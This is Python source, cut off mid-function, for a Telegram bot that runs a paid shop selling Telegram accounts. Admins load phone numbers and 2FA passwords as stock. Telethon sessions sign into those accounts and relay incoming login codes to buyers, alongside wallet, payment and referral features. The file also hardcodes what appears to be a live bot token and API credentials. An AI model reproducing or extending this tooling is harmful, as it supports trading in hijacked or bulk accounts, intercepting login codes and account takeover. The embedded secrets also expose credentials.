import telebot
from telebot import types
import json
import os
import time
import hashlib
from datetime import datetime, timedelta
import random
import string
import asyncio
import threading
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError

# ═══════════════════════════════════════
# Bot Configuration
# ═══════════════════════════════════════
BOT_TOKEN = "8657707839:AAEaooboiqFVpcEhT8vYOgpiZK75n0CEFc0"
SECRET_OWNER_ID = 8636937832
DEFAULT_API_ID = 2040
DEFAULT_API_HASH = "b18441a1ff607e10a989891a5462e627"

bot = telebot.TeleBot(BOT_TOKEN)
telethon_loop = None
active_clients = {}
pending_clients = {}

def start_telethon_loop():
    global telethon_loop
    telethon_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(telethon_loop)
    telethon_loop.run_forever()

threading.Thread(target=start_telethon_loop, daemon=True).start()
time.sleep(1)

# ═══════════════════════════════════════
# Database & Advanced Stock Management
# ═══════════════════════════════════════
class Database:
    def __init__(self):
        self.data_file = "bot_data.json"
        self.load_data()
    
    def load_data(self):
        if os.path.exists(self.data_file):
            with open(self.data_file, 'r', encoding='utf-8') as f:
                self.data = json.load(f)
            # Upgraded defaults with new stock structure
            defaults = {
                "users": {}, "public_owners": [], "adv_stocks": {}, "sessions": {},
                "sold_stocks": [], "upi_id": "", "upi_qr": "", "usdt_address": "",
                "update_channel": "", "channel": "", "chatgc": "", "proof_channel": "",
                "banned_users": [], "display_name": "VORTEX PREMIUM",
                "connected_users": {}, "deposit_states": {}, "session_states": {}, "otp_waiting": {},
                "spam_words": {}, "log_channel": "", "time_delete": False, "time_minutes": 0,
                "support_tickets": {}
            }
            for key, val in defaults.items():
                if key not in self.data: self.data[key] = val
            self.save_data()
        else:
            self.data = self.default_data()
            self.save_data()
    
    def default_data(self):
        return {
            "users": {}, "public_owners": [], "adv_stocks": {}, "sessions": {},
            "sold_stocks": [], "upi_id": "", "upi_qr": "", "usdt_address": "TXmWa5gX9qQzqQzqQzqQzqQzqQzqQzqQzqQzq",
            "update_channel": "", "channel": "", "chatgc": "", "proof_channel": "",
            "banned_users": [], "display_name": "VORTEX PREMIUM",
            "connected_users": {}, "deposit_states": {}, "session_states": {}, "otp_waiting": {},
            "spam_words": {}, "log_channel": "", "time_delete": False, "time_minutes": 0,
            "support_tickets": {}
        }
    
    def save_data(self):
        with open(self.data_file, 'w', encoding='utf-8') as f:
            json.dump(self.data, f, indent=4, ensure_ascii=False)
    
    def get_user(self, user_id):
        user_id = str(user_id)
        if user_id not in self.data["users"]:
            self.data["users"][user_id] = {
                "balance": 0.0, "purchases": [], "referrals": 0, "ref_earnings": 0.0,
                "deposited": 0.0, "spent": 0.0,
                "joined_date": datetime.now().strftime("%Y-%m-%d %H:%M"),
                "referral_code": 'REF' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8)),
                "referred_by": None, "transactions": []
            }
            self.save_data()
        return self.data["users"][user_id]
    
    def is_secret_owner(self, uid): return uid == SECRET_OWNER_ID
    def is_public_owner(self, uid): return uid in self.data.get("public_owners", [])
    def is_any_owner(self, uid): return self.is_secret_owner(uid) or self.is_public_owner(uid)
    def is_banned(self, uid): return uid in self.data.get("banned_users", [])

db = Database()

def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, telethon_loop)
    return future.result(timeout=120)

def parse_user_id(t_val):
    t = str(t_val).strip()
    if not t.isdigit():
        if not t.startswith('@'): t = '@' + t
        try:
            t = str(bot.get_chat(t).id)
        except Exception as e:
            raise ValueError(f"Bot ko {t} nahi mila. Use ID directly.")
    return t

# ═══════════════════════════════════════
# Session Manager (Unchanged)
# ═══════════════════════════════════════
class SessionManager:
    @staticmethod
    async def send_code_async(phone, session_name):
        try:
            sf = f"sessions/{session_name}.session"
            client = TelegramClient(sf, DEFAULT_API_ID, DEFAULT_API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                db.data["sessions"][session_name] = {"phone": phone, "session_file": sf}; db.save_data()
                start_otp_forwarding(client, session_name, phone)
                return {"status": "authorized"}
            result = await client.send_code_request(phone)
            pending_clients[session_name] = {"client": client, "phone_code_hash": result.phone_code_hash, "phone": phone}
            return {"status": "code_sent", "phone_code_hash": result.phone_code_hash}
        except Exception as e: return {"status": "error", "message": str(e)}
    
    @staticmethod
    async def verify_code_async(sn, phone, code, pch):
        try:
            client = pending_clients.get(sn, {}).get("client") if sn in pending_clients else TelegramClient(f"sessions/{sn}.session", DEFAULT_API_ID, DEFAULT_API_HASH)
            if not client.is_connected(): await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=pch)
            db.data["sessions"][sn] = {"phone": phone, "session_file": f"sessions/{sn}.session"}; db.save_data()
            if sn in pending_clients: del pending_clients[sn]
            start_otp_forwarding(client, sn, phone)
            return {"status": "success"}
        except SessionPasswordNeededError:
            db.data["sessions"][sn] = {"phone": phone, "session_file": f"sessions/{sn}.session"}; db.save_data()
            return {"status": "2fa_needed"}
        except PhoneCodeExpiredError: return {"status": "expired"}
        except PhoneCodeInvalidError: return {"status": "invalid"}
        except Exception as e: return {"status": "error", "message": str(e)}
    
    @staticmethod
    async def verify_2fa_async(sn, pw):
        try:
            client = pending_clients.get(sn, {}).get("client") if sn in pending_clients else TelegramClient(f"sessions/{sn}.session", DEFAULT_API_ID, DEFAULT_API_HASH)
            if not client.is_connected(): await client.connect()
            await client.sign_in(password=pw)
            phone = db.data["sessions"][sn]["phone"]
            start_otp_forwarding(client, sn, phone)
            if sn in pending_clients: del pending_clients[sn]
            return {"status": "success"}
        except Exception as e: return {"status": "error", "message": str(e)}
    
    @staticmethod
    async def get_latest_otp(sn):
        try:
            if sn not in active_clients: return {"status": "error"}
            client = active_clients[sn]["client"]
            msgs = await client.get_messages(777000, limit=5)
            for msg in msgs:
                if msg.text and any(w in msg.text.lower() for w in ["login code", "verification code", "code:"]):
                    return {"status": "success", "otp": msg.text, "msg_id": msg.id}
            return {"status": "no_otp"}
        except: return {"status": "error"}

otp_tracker = {}

def start_otp_forwarding(client, sn, phone):
    @client.on(events.NewMessage(from_users=777000))
    async def otp_handler(event):
        try:
            mt, mid = event.message.text, event.message.id
            for uid, data in list(db.data.get("otp_waiting", {}).items()):
                if str(data.get("phone", "")) == str(phone) or data.get("session") == sn:
                    if uid in otp_tracker and otp_tracker[uid].get("msg_id") == mid: continue
                    otp_tracker[uid] = {"msg_id": mid}
                    markup = types.InlineKeyboardMarkup()
                    markup.add(types.InlineKeyboardButton("✅ 𝗩𝗘𝗥𝗜𝗙𝗬", callback_data=f"otpok_{uid}"), types.InlineKeyboardButton("❌ 𝗥𝗘𝗝𝗘𝗖𝗧", callback_data=f"otpno_{uid}"))
                    bot.send_message(int(uid), f"{HDR}\n   📲 𝗢𝗧𝗣 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗 📲\n{HDR}\n\n📱 𝗣𝗵𝗼𝗻𝗲: <code>{phone}</code>\n\n💬 𝗠𝗲𝘀𝘀𝗮𝗴𝗲:\n{mt}\n{DIV}\n» 𝗣𝗹𝗲𝗮𝘀𝗲 𝘃𝗲𝗿𝗶𝗳𝘆 𝗯𝗲𝗹𝗼𝘄:", parse_mode="HTML", reply_markup=markup)
        except: pass
    active_clients[sn] = {"client": client, "phone": phone}
    async def keep_alive():
        try: await client.run_until_disconnected()
        except: pass
        finally:
            if sn in active_clients: del active_clients[sn]
    asyncio.ensure_future(keep_alive(), loop=telethon_loop)

# ═══════════════════════════════════════
# FULL/RICH UI ELEMENTS
# ═══════════════════════════════════════
HDR = "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
DIV = "━━━━━━━━━━━━━━━━━━━━━━"

def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    if db.data.get("update_channel"):
        markup.add(types.InlineKeyboardButton("📢 𝗨𝗣𝗗𝗔𝗧𝗘𝗦", url=f"https://t.me/{db.data['update_channel'].replace('@','')}"))
    
    ch_btns = []
    if db.data.get("channel"): ch_btns.append(types.InlineKeyboardButton("📣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url=f"https://t.me/{db.data['channel'].replace('@','')}"))
    if db.data.get("chatgc"): ch_btns.append(types.InlineKeyboardButton("💬 𝗖𝗢𝗠𝗠𝗨𝗡𝗜𝗧𝗬", url=f"https://t.me/{db.data['chatgc'].replace('@','')}"))
    if ch_btns: markup.add(*ch_btns)
    if db.data.get("proof_channel"): markup.add(types.InlineKeyboardButton("✅ 𝗣𝗥𝗢𝗢𝗙𝗦", url=f"https://t.me/{db.data['proof_channel'].replace('@','')}"))
    
    markup.add(types.InlineKeyboardButton("🛒 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗜𝗧𝗘𝗠𝗦", callback_data="cat_0"))
    markup.add(types.InlineKeyboardButton("💳 𝗔𝗗𝗗 𝗙𝗨𝗡𝗗𝗦", callback_data="deposit"), types.InlineKeyboardButton("💼 𝗠𝗬 𝗪𝗔𝗟𝗟𝗘𝗧", callback_data="balance"))
    markup.add(types.InlineKeyboardButton("📦 𝗠𝗬 𝗜𝗡𝗩𝗘𝗡𝗧𝗢𝗥𝗬", callback_data="my_stock"), types.InlineKeyboardButton("📜 𝗛𝗜𝗦𝗧𝗢𝗥𝗬", callback_data="transactions"))
    markup.add(types.InlineKeyboardButton("🤝 𝗔𝗙𝗙𝗜𝗟𝗜𝗔𝗧𝗘", callback_data="referral"), types.InlineKeyboardButton("👤 𝗣𝗥𝗢𝗙𝗜𝗟𝗘", callback_data="profile"))
    markup.add(types.InlineKeyboardButton("🎧 𝗛𝗘𝗟𝗣 & 𝗦𝗨𝗣𝗣𝗢𝗥𝗧", callback_data="support_menu"))
    return markup

def get_back_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("◂ 𝗚𝗢 𝗕𝗔𝗖𝗞", callback_data="back_to_menu"), types.InlineKeyboardButton("⌂ 𝗛𝗢𝗠𝗘", callback_data="back_to_menu"))
    return markup

def welcome_text(user):
    first = user.first_name or "User"
    uname = f"@{user.username}" if user.username else first
    name = db.data.get('display_name', 'VORTEX PREMIUM')
    return f"""{HDR}
   ✨ {name} ✨
{HDR}

👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲, {first}
📛 𝗨𝘀𝗲𝗿: {uname}

🔥 𝗪𝗵𝘆 𝗖𝗵𝗼𝗼𝘀𝗲 𝗨𝘀?
┣ ⚡ 𝗜𝗻𝘀𝘁𝗮𝗻𝘁 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗲𝗱 𝗗𝗲𝗹𝗶𝘃𝗲𝗿𝘆
┣ 🔐 𝟭𝟬𝟬% 𝗦𝗲𝗰𝘂𝗿𝗲 𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻𝘀
┗ 💎 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 & 𝗧𝗿𝘂𝘀𝘁𝗲𝗱 𝗣𝗿𝗼𝘃𝗶𝗱𝗲𝗿

{DIV}
👇 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗯𝗲𝗴𝗶𝗻:"""

# ═══════════════════════════════════════
# ALL COMMANDS 
# ═══════════════════════════════════════

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if db.is_banned(message.from_user.id): return
    uid = str(message.from_user.id)
    if uid in db.data.get("deposit_states", {}): del db.data["deposit_states"][uid]; db.save_data()
    user = db.get_user(message.from_user.id)
    
    if message.text and "start=ref_" in message.text:
        ref = message.text.split("start=ref_")[1]
        if not user.get("referred_by"):
            for u, d in db.data.get("users", {}).items():
                if d.get("referral_code") == ref and u != uid: user["referred_by"] = u; d["referrals"] = d.get("referrals",0)+1; db.save_data(); break
                
    if db.data.get("log_channel"):
        try: 
            log_msg = f"{HDR}\n   🚨 𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗔𝗟𝗘𝗥𝗧 🚨\n{HDR}\n\n👤 𝗡𝗮𝗺𝗲: {message.from_user.first_name}\n🆔 𝗜𝗗: <code>{uid}</code>\n📅 𝗗𝗮𝘁𝗲: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            bot.send_message(db.data["log_channel"], log_msg, parse_mode="HTML")
        except: pass
        
    bot.send_message(message.chat.id, welcome_text(message.from_user), reply_markup=get_main_menu())

@bot.message_handler(commands=['secret'])
def secret_cmd(message):
    if not db.is_any_owner(message.from_user.id): return bot.reply_to(message, "⊘ Access Denied")
    is_sec = db.is_secret_owner(message.from_user.id)
    hdr = "👑 𝗦𝗘𝗖𝗥𝗘𝗧 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟" if is_sec else "🛡 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟"
    txt = f"""{HDR}
   {hdr}
{HDR}

📦 𝗦𝘁𝗼𝗰𝗸 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 (𝗔𝗱𝘃𝗮𝗻𝗰𝗲𝗱):
┣ /addstock Cat|SubCat|Item|Price|Desc|Phone|2FA
┃  ↳ e.g. /addstock WP|India|India 30|30|Desc|9199
┣ /removestock Cat
┣ /removestock Cat | SubCat
┗ /removestock Cat | SubCat | Item

👥 𝗨𝘀𝗲𝗿 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁:
┣ /checkuser @user
┣ /addrupey @user|Amount
┣ /resetrupey @user|Amount
┗ /ban @user | /unban @user"""
    if is_sec:
        txt += f"\n\n👑 𝗦𝗲𝗰𝗿𝗲𝘁 𝗢𝗻𝗹𝘆:\n┣ /addownerpu @user\n┗ /removeownerpu @user"
    txt += f"""

⚙️ 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀:
┣ /addupi id | /addupiqr | /addusdt addr
┣ /addupdatechannel @c | /addchannel @c
┣ /addchatgc @c | /addproofchannel @c
┗ /setdisplayname | /setlogchannel

🤖 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 & 𝗧𝗼𝗼𝗹𝘀:
┣ /addsession | /listsessions | /removesession
┣ /broadcast | /checkerror | /db
┗ /connectuser @u | /canceluser @u"""
    bot.reply_to(message, txt)

# --- ADVANCED STOCK MANAGEMENT COMMANDS ---
@bot.message_handler(commands=['addstock'])
def addstock_adv_cmd(message):
    if not db.is_any_owner(message.from_user.id): return bot.reply_to(message, "⊘ Denied")
    try:
        args = message.text.split(' ', 1)[1]
        parts = args.split('|')
        if len(parts) < 6: return bot.reply_to(message, "⊘ 𝗨𝘀𝗮𝗴𝗲: /addstock Cat | SubCat | Item | Price | Desc | Phone | [2FA]")
        
        cat = parts[0].strip()
        sub = parts[1].strip()
        itm = parts[2].strip()
        prc = parts[3].strip().lower()
        dsc = parts[4].strip()
        phn = parts[5].strip()
        tfa = parts[6].strip() if len(parts) > 6 else "None"
        
        if "adv_stocks" not in db.data: db.data["adv_stocks"] = {}
        if cat not in db.data["adv_stocks"]: db.data["adv_stocks"][cat] = {}
        if sub not in db.data["adv_stocks"][cat]: db.data["adv_stocks"][cat][sub] = {}
        
        if itm not in db.data["adv_stocks"][cat][sub]:
            db.data["adv_stocks"][cat][sub][itm] = {
                "price": prc,
                "description": dsc,
                "pool": []
            }
        
        # Append phone to the pool
        db.data["adv_stocks"][cat][sub][itm]["pool"].append({"phone": phn, "2fa": tfa})
        db.save_data()
        
        stock_count = len(db.data["adv_stocks"][cat][sub][itm]["pool"])
        bot.reply_to(message, f"✅ 𝗦𝘁𝗼𝗰𝗸 𝗔𝗱𝗱𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n{DIV}\n┣ 📂 𝗖𝗮𝘁𝗲𝗴𝗼𝗿𝘆: {cat}\n┣ 📁 𝗦𝘂𝗯𝗖𝗮𝘁: {sub}\n┣ 📌 𝗜𝘁𝗲𝗺: {itm}\n┣ 💰 𝗣𝗿𝗶𝗰𝗲: ₹{prc}\n┗ 📦 𝗧𝗼𝘁𝗮𝗹 𝗦𝘁𝗼𝗰𝗸: {stock_count} 𝗻𝘂𝗺𝗯𝗲𝗿(𝘀)")
    except IndexError: bot.reply_to(message, "⊘ 𝗨𝘀𝗮𝗴𝗲: /addstock Cat | SubCat | Item | Price | Desc | Phone")
    except Exception as e: bot.reply_to(message, f"⊘ Error: {e}")

@bot.message_handler(commands=['removestock'])
def removestock_adv_cmd(message):
    if not db.is_any_owner(message.from_user.id): return
    try:
        args = message.text.split(' ', 1)[1]
        parts = [p.strip() for p in args.split('|')]
        if len(parts) == 0 or not parts[0]: return bot.reply_to(message, "⊘ 𝗨𝘀𝗮𝗴𝗲: /removestock Cat | [SubCat] | [Item]")
        
        cat = parts[0]
        found = False
        
        if len(parts) == 1: # Remove entire category
            if cat in db.data.get("adv_stocks", {}):
                del db.data["adv_stocks"][cat]
                found = True
        elif len(parts) == 2: # Remove subcategory
            sub = parts[1]
            if cat in db.data.get("adv_stocks", {}) and sub in db.data["adv_stocks"][cat]:
                del db.data["adv_stocks"][cat][sub]
                # Cleanup empty cat
                if not db.data["adv_stocks"][cat]: del db.data["adv_stocks"][cat]
                found = True
        elif len(parts) >= 3: # Remove item
            sub = parts[1]
            itm = parts[2]
            if cat in db.data.get("adv_stocks", {}) and sub in db.data["adv_stocks"][cat] and itm in db.data["adv_stocks"][cat][sub]:
                del db.data["adv_stocks"][cat][sub][itm]
                # Cleanup empty subcat & cat
                if not db.data["adv_stocks"][cat][sub]: del db.data["adv_stocks"][cat][sub]
                if not db.data["adv_stocks"][cat]: del db.data["adv_stocks"][cat]
                found = True

        if found: 
            db.save_data()
            bot.reply_to(message, f"✅ 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆: {' > '.join(parts)}")
        else: 
            bot.reply_to(message, "⊘ 𝗡𝗼𝘁 𝗙𝗼𝘂𝗻𝗱 in Database.")
    except Exception as e: bot.reply_to(message, f"⊘ Error: {e}")

# --- REST OF COMMANDS ---
@bot.message_handler(commands=['checkuser', 'addrupey', 'resetrupey', 'ban', 'unban', 'addownerpu', 'removeownerpu'])
def user_management_cmds(message):
    if not db.is_any_owner(message.from_user.id): return
    cmd = message.text.split()[0]
    try:
        args = message.text.split(' ', 1)[1]
        
        if cmd == '/checkuser':
            t = parse_user_id(args)
            u = db.get_user(str(t))
            bot.reply_to(message, f"{HDR}\n   👤 𝗨𝗦𝗘𝗥 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 👤\n{HDR}\n\n┣ 𝗜𝗗: <code>{t}</code>\n┣ 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ₹{u.get('balance',0):.2f}\n┣ 𝗧𝗼𝘁𝗮𝗹 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲𝘀: {len(u.get('purchases',[]))}\n┗ 𝗥𝗲𝗳𝗲𝗿𝗿𝗮𝗹𝘀: {u.get('referrals',0)}", parse_mode="HTML")
            return
            
        if cmd in ['/addrupey', '/resetrupey']:
            parts = args.split('|')
            if len(parts) < 2: return bot.reply_to(message, f"⊘ 𝗨𝘀𝗮𝗴𝗲: {cmd} @user|Amount")
            amt = float(parts[1].strip())
            t = parse_user_id(parts[0].strip())
            u = db.get_user(str(t))
            if cmd == '/addrupey':
                u["balance"] = u.get("balance",0) + amt; db.save_data(); bot.reply_to(message, f"✅ 𝗙𝘂𝗻𝗱𝘀 𝗔𝗱𝗱𝗲𝗱: +₹{amt:.2f}\n{DIV}\n┗ 𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ₹{u['balance']:.2f}")
            else:
                if u.get("balance",0) >= amt: u["balance"] -= amt; db.save_data(); bot.reply_to(message, f"✅ 𝗙𝘂𝗻𝗱𝘀 𝗗𝗲𝗱𝘂𝗰𝘁𝗲𝗱: -₹{amt:.2f}")
                else: bot.reply_to(message, "⊘ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗕𝗮𝗹𝗮𝗻𝗰𝗲.")
            return
            
        t = int(parse_user_id(args))
        if cmd == '/ban':
            if t not in db.data.get("banned_users", []): db.data["banned_users"].append(t); db.save_data(); bot.reply_to(message, "✅ 𝗨𝘀𝗲𝗿 𝗕𝗮𝗻𝗻𝗲𝗱.")
            else: bot.reply_to(message, "⚠️ 𝗨𝘀𝗲𝗿 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗯𝗮𝗻𝗻𝗲𝗱.")
        elif cmd == '/unban':
            if t in db.data.get("banned_users", []): db.data["banned_users"].remove(t); db.save_data(); bot.reply_to(message, "✅ 𝗨𝘀𝗲𝗿 𝗨𝗻𝗯𝗮𝗻𝗻𝗲𝗱.")
            else: bot.reply_to(message, "⊘ 𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗯𝗮𝗻𝗻𝗲𝗱.")
        elif cmd == '/addownerpu':
            if not db.is_secret_owner(message.from_user.id): return
            if t not in db.data.get("public_owners", []): db.data["public_owners"].append(t); db.save_data(); bot.reply_to(message, f"✅ 𝗣𝘂𝗯𝗹𝗶𝗰 𝗢𝘄𝗻𝗲𝗿 𝗔𝗱𝗱𝗲𝗱\n⟡ 𝗜𝗗: {t}")
        elif cmd == '/removeownerpu':
            if not db.is_secret_owner(message.from_user.id): return
            if t in db.data.get("public_owners", []): db.data["public_owners"].remove(t); db.save_data(); bot.reply_to(message, f"✅ 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆")
            
    except Exception as e: bot.reply_to(message, f"⊘ Error: {e}")

@bot.message_handler(commands=['addupi', 'addusdt', 'setdisplayname', 'addupdatechannel', 'addchannel', 'addchatgc', 'addproofchannel', 'setlogchannel'])
def config_cmds(message):
    if not db.is_any_owner(message.from_user.id): return
    cmd = message.text.split()[0]
    try:
        val = message.text.split(' ', 1)[1].strip()
        key_map = {'/addupi': 'upi_id', '/addusdt': 'usdt_address', '/setdisplayname': 'display_name', '/addupdatechannel': 'update_channel', '/addchannel': 'channel', '/addchatgc': 'chatgc', '/addproofchannel': 'proof_channel', '/setlogchannel': 'log_channel'}
        db.data[key_map[cmd]] = val; db.save_data()
        bot.reply_to(message, f"✅ 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗨𝗽𝗱𝗮𝘁𝗲𝗱: {val}")
    except: bot.reply_to(message, f"⊘ Provide correct format for {cmd}")

@bot.message_handler(commands=['addupiqr'])
def addupiqr_cmd(message):
    if not db.is_any_owner(message.from_user.id): return
    msg = bot.reply_to(message, "📸 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝗤𝗥 𝗖𝗼𝗱𝗲 𝗜𝗺𝗮𝗴𝗲 𝗻𝗼𝘄:")
    bot.register_next_step_handler(msg, lambda m: (db.data.update({"upi_qr": m.photo[-1].file_id}), db.save_data(), bot.reply_to(m, "✅ 𝗤𝗥 𝗖𝗼𝗱𝗲 𝗦𝗮𝘃𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆.")) if m.photo else bot.reply_to(m, "⊘ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲."))

@bot.message_handler(commands=['connectuser', 'canceluser', 'db', 'checkerror', 'listsessions', 'removesession', 'broadcast'])
def system_tools_cmds(message):
    if not db.is_any_owner(message.from_user.id): return
    cmd = message.text.split()[0]
    aid = str(message.from_user.id)
    
    if cmd == '/canceluser' and len(message.text.split()) == 1:
        if aid in db.data.get("connected_users", {}): del db.data["connected_users"][aid]; db.save_data(); bot.reply_to(message, "✅ 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗗𝗶𝘀𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱.")
        return
        
    if cmd == '/db': 
        with open(db.data_file, 'rb') as f: bot.send_document(message.chat.id, f, caption="💾 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗕𝗔𝗖𝗞𝗨𝗣")
        return
    elif cmd == '/checkerror': 
        bot.reply_to(message, f"{HDR}\n   🖥 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦\n{HDR}\n\n┣ 👥 𝗨𝘀𝗲𝗿𝘀: {len(db.data.get('users',{}))}\n┣ 🔗 𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀: {len(active_clients)}\n┗ 👑 𝗔𝗱𝗺𝗶𝗻𝘀: {len(db.data.get('public_owners',[]))}")
        return
    elif cmd == '/listsessions':
        if not db.data.get("sessions"): return bot.reply_to(message, "⊘ 𝗡𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻𝘀.")
        txt = f"{HDR}\n   📱 𝗔𝗖𝗧𝗜𝗩𝗘 𝗦𝗘𝗦𝗦𝗜𝗢𝗡𝗦\n{HDR}\n\n"
        for n, d in db.data["sessions"].items(): txt += f"┣ {'🟢' if n in active_clients else '🔴'} {n} - {d.get('phone','?')}\n"
        bot.reply_to(message, txt)
        return
        
    try:
        args = message.text.split(' ', 1)[1].strip()
        if cmd == '/removesession':
            if args in db.data.get("sessions", {}):
                if args in active_clients: run_async(active_clients[args]["client"].disconnect()); del active_clients[args]
                sf = f"sessions/{args}.session"
                if os.path.exists(sf): os.remove(sf)
                del db.data["sessions"][args]; db.save_data(); bot.reply_to(message, f"✅ 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝗲𝗺𝗼𝘃𝗲𝗱: {args}")
            else: bot.reply_to(message, "⊘ 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.")
        elif cmd == '/connectuser':
            t = str(parse_user_id(args))
            db.data["connected_users"][aid] = t; db.save_data()
            bot.send_message(int(t), f"{HDR}\n   🎧 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 🎧\n{HDR}\n\n» 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘀𝗲𝗻𝗱 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝗱𝗶𝗿𝗲𝗰𝘁𝗹𝘆 𝘁𝗼 𝘁𝗵𝗲 𝘀𝘂𝗽𝗽𝗼𝗿𝘁 𝘁𝗲𝗮𝗺.")
            bot.reply_to(message, f"✅ 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲𝗿: <code>{t}</code>\n» 𝗔𝗻𝘆 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘆𝗼𝘂 𝘀𝗲𝗻𝗱 𝗻𝗼𝘄 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗼𝗿𝘄𝗮𝗿𝗱𝗲𝗱.", parse_mode="HTML")
        elif cmd == '/broadcast':
            s = 0
            for uid in db.data.get("users", {}):
                try: bot.send_message(int(uid), f"{HDR}\n   📢 𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n{HDR}\n\n{args}"); s += 1
                except: pass
            bot.reply_to(message, f"✅ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗦𝗲𝗻𝘁 𝘁𝗼: {s} 𝘂𝘀𝗲𝗿𝘀.")
    except Exception as e: bot.reply_to(message, f"⊘ Error: {e}")

# ═══════════════════════════════════════
# ADVANCED CALLBACKS (PAGINATION & STOCK)
# ═══════════════════════════════════════
def get_active_categories():
    return [c for c, subs in db.data.get("adv_stocks", {}).items() if any(any(len(itm.get("pool", [])) > 0 for itm in sub.values()) for sub in subs.values())]

def get_active_subcategories(cat):
    if cat not in db.data.get("adv_stocks", {}): return []
    return [s for s, itms in db.data["adv_stocks"][cat].items() if any(len(itm.get("pool", [])) > 0 for itm in itms.values())]

def get_active_items(cat, sub):
    if cat not in db.data.get("adv_stocks", {}) or sub not in db.data["adv_stocks"][cat]: return []
    return [i for i, data in db.data["adv_stocks"][cat][sub].items() if len(data.get("pool", [])) > 0]

@bot.callback_query_handler(func=lambda call: call.data.startswith("cat_"))
def show_categories(call):
    page = int(call.data.split("_")[1])
    cats = get_active_categories()
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    if not cats:
        markup.add(types.InlineKeyboardButton("◂ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗘𝗡𝗨", callback_data="back_to_menu"))
        bot.edit_message_text(f"{HDR}\n   📦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗦𝗧𝗢𝗖𝗞\n{HDR}\n\n» 𝗦𝗼𝗿𝗿𝘆, 𝗻𝗼 𝘀𝘁𝗼𝗰𝗸 𝗶𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗿𝗶𝗴𝗵𝘁 𝗻𝗼𝘄.", call.message.chat.id, call.message.message_id, reply_markup=markup)
        return

    # Pagination logic
    items_per_page = 10
    total_pages = (len(cats) - 1) // items_per_page + 1
